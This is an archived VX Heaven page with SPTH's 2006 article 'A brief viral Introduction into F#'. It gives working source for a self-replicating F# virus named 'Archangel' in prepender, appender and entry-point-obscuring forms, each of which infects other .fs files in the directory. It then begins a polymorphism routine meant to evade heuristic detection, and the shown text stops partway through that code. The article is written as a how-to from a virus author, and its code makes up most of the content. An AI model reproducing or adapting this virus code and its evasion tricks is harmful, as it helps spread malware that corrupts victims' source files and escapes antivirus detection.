<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> SPTH 'A brief viral Introduction into F#' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="SPTH"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, SPTH,brief viral Introduction into F#, hfile, vall, hcode, vfile, number, victim, reads, polymorphism, point, entry, obscuring, method, place, length, strange"/>
<meta name="Description" content="In 2004/2005 Microsoft has started a new field of researching - with an interesting idea: Combining a functional language with the .NET Framework. The result of the research is a language called F# - a .NET variant of ML with a core language similar to that of the OCaml programming language."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"5c0dcd32875203b06516d79b3a1b1d875263c9ef-1498755690-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vsp30.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>A brief viral Introduction into F#</h1><p><a href="/lib/?lang=en&amp;author=SPTH"> SPTH</a><br/> <em><a href="/vx.php?fid=1512#f1512">Ready Rangers Liberation Front [7]</a></em><br/> <em>July 2006</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vsp30.html';</script><div class="ci"><a href="/lib/?ci=vsp30">1</a></div>[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp30">Back to index</a>] [<a href="/lib/vsp30.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#c0">Intro Words</a></li>
<li><a href="#c1">File infection</a>
<ul>
<li><a href="#c11">Prepender</a></li>
<li><a href="#c12">Appender</a></li>
<li><a href="#c13">Entry Point Obscuring</a></li>
</ul></li>
<li><a href="#c2">Polymorphism</a>
<ul>
<li><a href="#c21">Number Changing</a></li>
<li><a href="#c22">Space Games</a></li>
</ul></li>
<li><a href="#c3">Outro Words</a></li>
</ul>
<h2><a name="c0"></a>Intro Words</h2>
<p>In 2004/2005 Microsoft has started a new field of researching - with an interesting idea: Combining a functional language with the .NET Framework. The result of the research is a language called F# - a .NET variant of ML with a core language similar to that of the OCaml programming language. Usual languages like this (Calm, maybe LISP) are only useful for research purpose, but Microsoft wants to change this additude.</p>
<p>I found the language first in an article of iX special 1/2006 called "Ein neuer Halbton" by Oliver Mueller [I've got the magazine by my boss for learning to use .NET with SQL 2005 - but well...). I was fascinated by the idea and wanted to write a virus for it - didn't know what will happen. I've tried it several times - without success - the language was just too strange. Then one weekend I said to myself "I DO IT NOW" - so I've used ~30 of non-stop researching, learning, reading, testing, coding... The problem is, that F#'s documentation is very poor and that the interpreter's Error Messages are very useless ("virus.fs(2,0): error: syntax error"), and the interpreter has still some very strange bugs. After I had nearly a nervous breakdown (no shit - imagine 30 hours of successless researching, repeated Gorillaz music, coffee, a few beer and much cigaretts), I found some secrets, and was able to write the world's first computer virus in F#. That was definitivly one of the great moments, which you don't forget soon.</p>
<p>You can get F# here: http://research.microsoft.com/projects/ilx/fsharp.aspx</p>
<p>OK - enough about this strange story - see my researches now...</p>
<h2><a name="c1"></a>File infection</h2>
<h3><a name="c11"></a>Prepender</h3>
<p>Finally, after ~ 30 hours and 2,5 packs of cigaretts, the first F# virus infected its victim. The code simply searchs for victims (*.fs files in the current directory), checks if the victim is already infected, if not it copies its own code before the victim code. For finding its own code, it uses the 'Sys.argv.(1)' method. '.fs'-scripts will be opened this way: 'fsi filename.fs'. The method returns the second argument given in the command line expression, which is the virus-filename. Now see the code...</p>
<div class="fsharp" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #5d478b; font-style: italic;">(* Archangel *)</span><br/>
<span style="color: #06c; font-weight: bold;">open</span> System.<span style="color: #060;">IO</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> vfile <span style="color: #a52a2a;">=</span> <span style="color: #06c; font-weight: bold;">new</span> StreamReader<span style="color: black;">&#40;</span>Sys.<span style="color: #060;">argv</span>.<span style="color: black;">&#40;</span><span style="color: #c6c;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> vcode <span style="color: #a52a2a;">=</span> <span style="color: black;">&#40;</span>vfile.<span style="color: #060;">ReadToEnd</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span>.<span style="color: #060;">Substring</span><span style="color: black;">&#40;</span><span style="color: #c6c;">0</span>,<span style="color: #c6c;">526</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> vclose <span style="color: #a52a2a;">=</span> vfile.<span style="color: #060;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> files <span style="color: #a52a2a;">=</span> Directory.<span style="color: #060;">GetFiles</span><span style="color: black;">&#40;</span><span style="color: #3cb371;">&quot;.&quot;</span>,<span style="color: #3cb371;">&quot;*.fs&quot;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
<br/>
<span style="color: #06c; font-weight: bold;">for</span> i <span style="color: #a52a2a;">=</span> <span style="color: #c6c;">0</span> <span style="color: #06c; font-weight: bold;">to</span> files.<span style="color: #060;">Length</span><span style="color: #a52a2a;">-</span><span style="color: #c6c;">1</span> <span style="color: #06c; font-weight: bold;">do</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">let</span> hfile <span style="color: #a52a2a;">=</span> <span style="color: #06c; font-weight: bold;">new</span> StreamReader<span style="color: black;">&#40;</span>files.<span style="color: black;">&#40;</span>i<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">in</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">let</span> hcode <span style="color: #a52a2a;">=</span> hfile.<span style="color: #060;">ReadToEnd</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">in</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">let</span> _ <span style="color: #a52a2a;">=</span> hfile.<span style="color: #060;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">in</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">if</span> <span style="color: black;">&#40;</span>hcode.<span style="color: #060;">Substring</span><span style="color: black;">&#40;</span><span style="color: #c6c;">3</span>,<span style="color: #c6c;">9</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">&lt;&gt;</span><span style="color: #3cb371;">&quot;Archangel&quot;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">then</span> <span style="color: #06c; font-weight: bold;">begin</span><br/>
&nbsp; &nbsp; <span style="color: #06c; font-weight: bold;">let</span> hfile <span style="color: #a52a2a;">=</span> <span style="color: #06c; font-weight: bold;">new</span> StreamWriter<span style="color: black;">&#40;</span>files.<span style="color: black;">&#40;</span>i<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">in</span><br/>
&nbsp; &nbsp; <span style="color: #06c; font-weight: bold;">let</span> _ <span style="color: #a52a2a;">=</span> hfile.<span style="color: #060;">Write</span><span style="color: black;">&#40;</span>vcode<span style="color: #a52a2a;">+</span>hcode<span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">in</span><br/>
&nbsp; &nbsp; hfile.<span style="color: #060;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">end</span><br/>
<span style="color: #06c; font-weight: bold;">done</span><br/>
&nbsp;</div>
<ul>
<li>First it opens the 'System.IO' namespace, so we don't have to write that expression again.</li>
<li>Then it opens and reads its own code.</li>
<li>Searchs for all f-sharp files in current directory</li>
<li>Reads the code of the victim</li>
<li>Checks if already infected</li>
<li>If not: INFECT!</li>
<li>Note: The empty last line is important!</li>
</ul>
<h3><a name="c12"></a>Appender</h3>
<p>The next infection type, as usual, is appending the code at the end of of the file. There are just a view changes. Look at the code and you will see:</p>
<div class="fsharp" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #5d478b; font-style: italic;">(* Archangel *)</span><br/>
<span style="color: #06c; font-weight: bold;">open</span> System.<span style="color: #060;">IO</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> vfile <span style="color: #a52a2a;">=</span> <span style="color: #06c; font-weight: bold;">new</span> StreamReader<span style="color: black;">&#40;</span>Sys.<span style="color: #060;">argv</span>.<span style="color: black;">&#40;</span><span style="color: #c6c;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> vall <span style="color: #a52a2a;">=</span> vfile.<span style="color: #060;">ReadToEnd</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> vcode <span style="color: #a52a2a;">=</span> vall.<span style="color: #060;">Substring</span><span style="color: black;">&#40;</span>vall.<span style="color: #060;">Length</span><span style="color: #a52a2a;">-</span><span style="color: #c6c;">576</span>,<span style="color: #c6c;">576</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
vfile.<span style="color: #060;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> files <span style="color: #a52a2a;">=</span> Directory.<span style="color: #060;">GetFiles</span><span style="color: black;">&#40;</span><span style="color: #3cb371;">&quot;.&quot;</span>,<span style="color: #3cb371;">&quot;*.fs&quot;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">for</span> i <span style="color: #a52a2a;">=</span> <span style="color: #c6c;">0</span> <span style="color: #06c; font-weight: bold;">to</span> files.<span style="color: #060;">Length</span><span style="color: #a52a2a;">-</span><span style="color: #c6c;">1</span> <span style="color: #06c; font-weight: bold;">do</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">let</span> hfile <span style="color: #a52a2a;">=</span> <span style="color: #06c; font-weight: bold;">new</span> StreamReader<span style="color: black;">&#40;</span>files.<span style="color: black;">&#40;</span>i<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">in</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">let</span> hcode <span style="color: #a52a2a;">=</span> hfile.<span style="color: #060;">ReadToEnd</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">in</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">let</span> _ <span style="color: #a52a2a;">=</span> hfile.<span style="color: #060;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">in</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">if</span> <span style="color: black;">&#40;</span>hcode.<span style="color: #060;">Substring</span><span style="color: black;">&#40;</span><span style="color: #c6c;">3</span>,<span style="color: #c6c;">9</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">&lt;&gt;</span><span style="color: #3cb371;">&quot;Archangel&quot;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">then</span> <span style="color: #06c; font-weight: bold;">begin</span><br/>
&nbsp; &nbsp; <span style="color: #06c; font-weight: bold;">let</span> hfile <span style="color: #a52a2a;">=</span> <span style="color: #06c; font-weight: bold;">new</span> StreamWriter<span style="color: black;">&#40;</span>files.<span style="color: black;">&#40;</span>i<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">in</span><br/>
&nbsp; &nbsp; <span style="color: #06c; font-weight: bold;">let</span> _ <span style="color: #a52a2a;">=</span> hfile.<span style="color: #060;">WriteLine</span><span style="color: black;">&#40;</span><span style="color: #3cb371;">&quot;(* Archangel *)&quot;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">in</span><br/>
&nbsp; &nbsp; <span style="color: #06c; font-weight: bold;">let</span> _ <span style="color: #a52a2a;">=</span> hfile.<span style="color: #060;">Write</span><span style="color: black;">&#40;</span>hcode<span style="color: #a52a2a;">+</span>vcode<span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">in</span><br/>
&nbsp; &nbsp; hfile.<span style="color: #060;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">end</span><br/>
<span style="color: #06c; font-weight: bold;">done</span><br/>
&nbsp;</div>
<ul>
<li>It prepares the infection: Includes 'System.IO', reads its own code, ect</li>
<li>Searchs for any f-sharp files in the directory</li>
<li>Reads the code and checks if it's already infected</li>
<li>If not infected, open it for writing</li>
<li>Write the infection marker at the start</li>
<li>Then write the host code and, in the end, the virus code</li>
</ul>
<h3><a name="c13"></a>Entry Point Obscuring</h3>
<p>As usual, I present you as third infection type "Entry Point Obscuring". This code first searchs a valueable place for infection, and writes its own code to that position. At complex files this code fails, as it just searchs for 0x0A+0x0D. But nevertheless, this all is prove-of-concept. At this code you can see the strange world of functionality for the first time (no direct counters, for-loops and if-statements as functions ect). For deeper explanation of the code, see the end.</p>
<div class="fsharp" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #5d478b; font-style: italic;">(* Archangel *)</span><br/>
<span style="color: #06c; font-weight: bold;">open</span> System.<span style="color: #060;">IO</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> vfile <span style="color: #a52a2a;">=</span> <span style="color: #06c; font-weight: bold;">new</span> StreamReader<span style="color: black;">&#40;</span>Sys.<span style="color: #060;">argv</span>.<span style="color: black;">&#40;</span><span style="color: #c6c;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> vall <span style="color: #a52a2a;">=</span> vfile.<span style="color: #060;">ReadToEnd</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> vcode <span style="color: #a52a2a;">=</span> vall.<span style="color: #060;">Substring</span><span style="color: black;">&#40;</span>vall.<span style="color: #060;">IndexOf</span><span style="color: black;">&#40;</span><span style="color: #3cb371;">&quot;(* Archangel *)&quot;</span><span style="color: black;">&#41;</span>,<span style="color: #c6c;">1082</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
vfile.<span style="color: #060;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> rand <span style="color: #a52a2a;">=</span> <span style="color: #06c; font-weight: bold;">new</span> System.<span style="color: #060;">Random</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> pos <span style="color: #a52a2a;">=</span> <span style="color: #06c; font-weight: bold;">ref</span> <span style="color: #c6c;">0</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> nl <span style="color: #a52a2a;">=</span> <span style="color: #3cb371;">&quot;<br/>
&quot;</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> files <span style="color: #a52a2a;">=</span> Directory.<span style="color: #060;">GetFiles</span><span style="color: black;">&#40;</span><span style="color: #3cb371;">&quot;.&quot;</span>,<span style="color: #3cb371;">&quot;*.fs&quot;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">for</span> i <span style="color: #a52a2a;">=</span> <span style="color: #c6c;">0</span> <span style="color: #06c; font-weight: bold;">to</span> files.<span style="color: #060;">Length</span><span style="color: #a52a2a;">-</span><span style="color: #c6c;">1</span> <span style="color: #06c; font-weight: bold;">do</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">let</span> oc <span style="color: #a52a2a;">=</span> <span style="color: #06c; font-weight: bold;">ref</span> <span style="color: #c6c;">0</span> <span style="color: #06c; font-weight: bold;">in</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">let</span> hfile <span style="color: #a52a2a;">=</span> <span style="color: #06c; font-weight: bold;">new</span> StreamReader<span style="color: black;">&#40;</span>files.<span style="color: black;">&#40;</span>i<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">in</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">let</span> hcode <span style="color: #a52a2a;">=</span> hfile.<span style="color: #060;">ReadToEnd</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">in</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">let</span> _ <span style="color: #a52a2a;">=</span> hfile.<span style="color: #060;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">in</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">if</span> <span style="color: black;">&#40;</span>hcode.<span style="color: #060;">IndexOf</span><span style="color: black;">&#40;</span><span style="color: #3cb371;">&quot;(* Archangel *)&quot;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">=</span><span style="color: black;">&#40;</span><span style="color: #a52a2a;">-</span><span style="color: #c6c;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">then</span> <span style="color: #06c; font-weight: bold;">begin</span><br/>
&nbsp; &nbsp; <span style="color: #06c; font-weight: bold;">for</span> j <span style="color: #a52a2a;">=</span> <span style="color: #c6c;">0</span> <span style="color: #06c; font-weight: bold;">to</span> hcode.<span style="color: #060;">Length</span><span style="color: #a52a2a;">-</span><span style="color: #c6c;">3</span> <span style="color: #06c; font-weight: bold;">do</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #06c; font-weight: bold;">if</span> <span style="color: black;">&#40;</span>hcode.<span style="color: #060;">Substring</span><span style="color: black;">&#40;</span>j,<span style="color: #c6c;">2</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">=</span>nl<span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">then</span> <span style="color: #06c; font-weight: bold;">begin</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; oc <span style="color: #a52a2a;">:=</span> <span style="color: #a52a2a;">!</span>oc <span style="color: #a52a2a;">+</span><span style="color: #c6c;">1</span><span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #06c; font-weight: bold;">end</span><br/>
&nbsp; &nbsp; done<span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp; pos <span style="color: #a52a2a;">:=</span> rand.<span style="color: #060;">Next</span><span style="color: black;">&#40;</span><span style="color: #a52a2a;">!</span>oc<span style="color: black;">&#41;</span><span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp; <span style="color: #06c; font-weight: bold;">for</span> j <span style="color: #a52a2a;">=</span> <span style="color: #c6c;">0</span> <span style="color: #06c; font-weight: bold;">to</span> hcode.<span style="color: #060;">Length</span><span style="color: #a52a2a;">-</span><span style="color: #c6c;">3</span> <span style="color: #06c; font-weight: bold;">do</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #06c; font-weight: bold;">if</span> <span style="color: black;">&#40;</span><span style="color: #a52a2a;">!</span>pos<span style="color: #a52a2a;">=</span><span style="color: #c6c;">0</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">then</span> <span style="color: #06c; font-weight: bold;">begin</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #06c; font-weight: bold;">let</span> hwfile <span style="color: #a52a2a;">=</span> <span style="color: #06c; font-weight: bold;">new</span> StreamWriter<span style="color: black;">&#40;</span>files.<span style="color: black;">&#40;</span>i<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">in</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #06c; font-weight: bold;">let</span> _ <span style="color: #a52a2a;">=</span> hwfile.<span style="color: #060;">Write</span><span style="color: black;">&#40;</span>hcode.<span style="color: #060;">Substring</span><span style="color: black;">&#40;</span><span style="color: #c6c;">0</span>,j<span style="color: black;">&#41;</span>^nl^vcode^nl^hcode.<span style="color: #060;">Substring</span><span style="color: black;">&#40;</span>j,hcode.<span style="color: #060;">Length</span><span style="color: #a52a2a;">-</span>j<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">in</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #06c; font-weight: bold;">let</span> _ <span style="color: #a52a2a;">=</span> hwfile.<span style="color: #060;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">in</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; pos <span style="color: #a52a2a;">:=</span> <span style="color: #c6c;">666</span><span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp; &nbsp; end<span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #06c; font-weight: bold;">if</span> <span style="color: black;">&#40;</span>hcode.<span style="color: #060;">Substring</span><span style="color: black;">&#40;</span>j,<span style="color: #c6c;">2</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">=</span>nl<span style="color: black;">&#41;</span> <span style="color: #06c; font-weight: bold;">then</span> <span style="color: #06c; font-weight: bold;">begin</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; pos <span style="color: #a52a2a;">:=</span> <span style="color: #a52a2a;">!</span>pos <span style="color: #a52a2a;">-</span> <span style="color: #c6c;">1</span><span style="color: #a52a2a;">;</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color: #06c; font-weight: bold;">end</span><br/>
&nbsp; &nbsp; done<span style="color: #a52a2a;">;</span><br/>
&nbsp; <span style="color: #06c; font-weight: bold;">end</span><br/>
<span style="color: #06c; font-weight: bold;">done</span><br/>
&nbsp;</div>
<ul>
<li>First it searchs it's own code by the .NET String Methode IndexOf.</li>
<li>It searchs for infectable files in the current directory.</li>
<li>It searchs for valueable places to infect in the victim file.</li>
<li>It gets a random place using .NET class System.Random() - method Next</li>
<li>It finds the random place again and includes the virus code there</li>
</ul>
<h2><a name="c2"></a>Polymorphism</h2>
<h3><a name="c21"></a>Number Changing</h3>
<p>This script polymorphism technique could be very useful against simple heuristic attacks. It changes a number in the code by chance ~33.3%. The new calculation is a representation of the number - like:</p>
<pre>
  1 = ((2/(0+1))-((3-1)-(1/1)))
</pre>
<p>It uses arichmetic operation ADD, SUB and MUL. It can not use DIV, because the numbers represent integer, not float.</p>
<p>There have been several difficulties while writing the code, like you can not change the counter of a for-loop (at least I didn't find a way). But as I could solve any problem, you can see the code now:</p>
<div class="fsharp" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #06c; font-weight: bold;">open</span> System.<span style="color: #060;">IO</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> vfile<span style="color: #a52a2a;">=</span><span style="color: #06c; font-weight: bold;">new</span> StreamReader<span style="color: black;">&#40;</span>Sys.<span style="color: #060;">argv</span>.<span style="color: black;">&#40;</span><span style="color: #c6c;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> vcode<span style="color: #a52a2a;">=</span>vfile.<span style="color: #060;">ReadToEnd</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
vfile.<span style="color: #060;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> vf<span style="color: #a52a2a;">=</span><span style="color: #06c; font-weight: bold;">new</span> StreamWriter<span style="color: black;">&#40;</span>Sys.<span style="color: #060;">argv</span>.<span style="color: black;">&#40;</span><span style="color: #c6c;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> changeval<span style="color: #a52a2a;">=</span><span style="color: #06c; font-weight: bold;">ref</span> false<span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> newcode<span style="color: #a52a2a;">=</span><span style="color: #06c; font-weight: bold;">ref</span><span style="color: #3cb371;">&quot;&quot;</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> nstr<span style="color: #a52a2a;">=</span><span style="color: #06c; font-weight: bold;">ref</span><span style="color: #3cb371;">&quot;&quot;</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> c<span style="color: #a52a2a;">=</span><span style="color: #06c; font-weight: bold;">ref</span> <span style="color: #c6c;">0</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> l<span style="color: #a52a2a;">=</span><span style="color: #06c; font-weight: bold;">ref</span> <span style="color: #c6c;">0</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> r<span style="color: #a52a2a;">=</span><span style="color: #06c; font-weight: bold;">ref</span> <span style="color: #c6c;">0</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> s<span style="color: #a52a2a;">=</span><span style="color: #06c; font-weight: bold;">ref</span> <span style="color: #3cb371;">&quot;&quot;</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> rand<span style="color: #a52a2a;">=</span><span style="color: #06c; font-weight: bold;">new</span> System.<span style="color: #060;">Random</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #a52a2a;">;;</span><br/>
<span style="color: #06c; font-weight: bold;">let</span> istrue num<span style="color: #a52a2a;">=</span><span style="color: #06c; font-weight: bold;">if</span> num<span style="color: #a52a2a;">=</span><span style="color: #c6c;">0</span> <span style="color: #06c; font-weight: bold;">then</span> <span style="color: #06c; font-weight: bold;">false</span> <span style="color: #06c; font-weight: bold;">else</span> true<span style="color: #a52a2a;">;;</span><br/>
